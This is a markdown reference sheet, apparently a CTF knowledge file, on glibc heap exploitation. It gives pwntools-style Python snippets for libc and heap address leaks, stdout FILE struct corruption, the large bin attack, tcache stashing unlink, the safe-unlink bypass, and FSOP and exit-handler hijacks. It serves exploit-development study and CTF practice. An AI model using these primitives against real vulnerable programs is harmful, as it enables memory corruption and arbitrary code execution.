# Heap Primitives

Building-block techniques used BY the House-of exploits. These are not standalone exploits — they give you a specific primitive (leak, write, overlap) that feeds into a full exploit chain.

## Unsorted Bin Leak (libc)
**When**: Can read a freed unsorted bin chunk's fd/bk.
```python
# IN: UAF or read-after-free on chunk > 0x410 (or tcache-full)
# OUT: libc base address
for i in range(7): alloc(i, 0x90); free(i)  # fill tcache
alloc(7, 0x90); alloc(8, 0x10)              # target + guard
free(7)                                      # → unsorted bin

leak = show(7)                               # read fd (UAF)
main_arena_offset = 0x3ebca0                 # adjust per libc
libc.address = u64(leak[:6].ljust(8, b'\x00')) - main_arena_offset - 96
assert libc.address & 0xfff == 0, "bad libc base alignment"
```

## Tcache Leak (heap base)
**When**: Can read a freed tcache chunk's fd (with safe-linking).
```python
# glibc 2.32+: fd_stored = actual_fd ^ (chunk_addr >> 12)
# First tcache entry has fd = 0 (end of list) → stored = 0 ^ (addr >> 12)
# So: heap_base_upper = leak_value << 12

alloc(0, 0x20); alloc(1, 0x20)
free(1); free(0)
leak = show(0)  # read fd of chunk 0 (head of tcache list)
encrypted_fd = u64(leak[:8])
heap_base = (encrypted_fd) << 12  # approximate — low bits may need adjustment
```

## stdout FILE Struct Leak (libc + stack)
**When**: Can overwrite `_IO_2_1_stdout_`'s `_flags` and `_IO_write_base` fields (e.g., partial overwrite via tcache poisoning or unsorted bin partial overwrite). No UAF read needed.
```python
# IN: partial write to stdout FILE struct  OUT: libc leak via stdout output
# _IO_2_1_stdout_ is at a known offset in libc.
# Overwrite _flags = 0xfbad1800 and _IO_write_base low byte to \x00
# → stdout flushes its internal buffer, leaking libc pointers on the buffer

# Typical approach: tcache poison to get allocation at _IO_2_1_stdout_
target = libc.sym['_IO_2_1_stdout_']
# Overwrite via tcache poisoning (see heap-basics.md)
# ...
# Write the partial overwrite payload:
payload = p64(0xfbad1800)  # _flags: _IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING
payload += p64(0) * 3      # _IO_read_ptr, _IO_read_end, _IO_read_base
payload += b'\x00'          # _IO_write_base low byte → points earlier in buffer
# When printf/puts next flushes, it outputs bytes from the buffer
# including libc pointers that were in stdout's internal buffer

leak = u64(p.recv(8))  # first 8 bytes of the leaked buffer
libc.address = leak - known_offset
assert libc.address & 0xfff == 0

# For STACK leak: overwrite _IO_write_base to point to environ pointer
# environ is at a known libc offset, contains a stack address
```
**Trap**: The `_flags` value is critical — wrong flags cause a crash instead of a leak. `0xfbad1800` is the standard magic. The `_IO_write_base` partial overwrite must point backwards into the buffer where pointers reside.

## Large Bin Attack (arbitrary address write)
**When**: Can corrupt a large bin chunk's `bk_nextsize` field. Writes a heap address (not arbitrary value) to a chosen target.
```python
# IN: UAF/overflow on large bin chunk  OUT: target_addr contains heap_addr
# Used by: House of Apple, Banana, Husk

# Step 1: Get two differently-sized large chunks into large bin
alloc(0, 0x428); alloc(1, 0x10)   # guard
alloc(2, 0x418); alloc(3, 0x10)   # guard
free(0)   # → unsorted bin
alloc(4, 0x440)  # triggers sort → chunk 0 moves to large bin
free(2)   # → unsorted bin

# Step 2: Corrupt chunk 0's bk_nextsize to (target_addr - 0x20)
edit(0, p64(0)*2 + p64(0) + p64(target_addr - 0x20))
# fd_nextsize stays, bk_nextsize → target - 0x20

# Step 3: Trigger sort → chunk 2 inserted into large bin
# The insertion writes chunk2_addr to target_addr
alloc(5, 0x440)
# Now: *(target_addr) == chunk2_addr
```

## Tcache Stashing Unlink
**When**: glibc 2.29+. Corrupt a small bin chunk's `bk`.
```python
# When malloc takes from small bin with tcache not full,
# remaining chunks are "stashed" into tcache via bk traversal.
# Corrupt bk → arbitrary address linked into tcache.

# Step 1: Put chunk in small bin (via unsorted bin sort)
# Step 2: Corrupt chunk's bk to point to (target_addr - 0x10)
# Step 3: Allocate from small bin → remaining chunks stashed via bk
# Step 4: target_addr is now in tcache → next alloc returns it
```

## Unlink (classic, hardened)
**When**: Can corrupt fd/bk of a chunk in doubly-linked bin (unsorted/small/large). | **Trap**: Safe-unlink check requires `fd->bk == P && bk->fd == P`.
```python
# Safe-unlink bypass: need a pointer to the chunk (e.g., global array)
# Set: fd = &global_ptr - 0x18, bk = &global_ptr - 0x10
# After unlink: global_ptr = &global_ptr - 0x18 → now writes to global_ptr
# overwrite the global pointer itself to gain further write primitive
```

## FSOP Overview
**What**: File Stream Oriented Programming. Corrupt an `_IO_FILE` struct so that when it's flushed (on `exit()`, `fclose()`, buffer full), the vtable dispatch calls an attacker-controlled function.

| glibc | Approach |
|---|---|
| < 2.24 | Direct vtable pointer overwrite |
| 2.24–2.33 | Use `_IO_str_overflow` (within validated vtable section) |
| 2.34+ | Use `_IO_wfile_overflow` wide vtable (House of Apple 2) |

Triggering: `exit()` → `_IO_flush_all_lockp` → iterates `_IO_list_all` → calls `__overflow` on each.

## Exit Handler Overwrite
**When**: glibc 2.34+, alternative to FSOP.
```python
# __exit_funcs contains a linked list of exit handlers
# Overwrite an entry to point to one_gadget/system
# Trigger: exit() or return from main
```

## TLS Destructor
**When**: glibc 2.34+, another FSOP alternative.
```python
# __call_tls_dtors iterates TLS destructor list at thread exit
# Overwrite tls_dtor_list head to point to controlled struct
# containing: func = one_gadget, obj = ptr, next = NULL
```
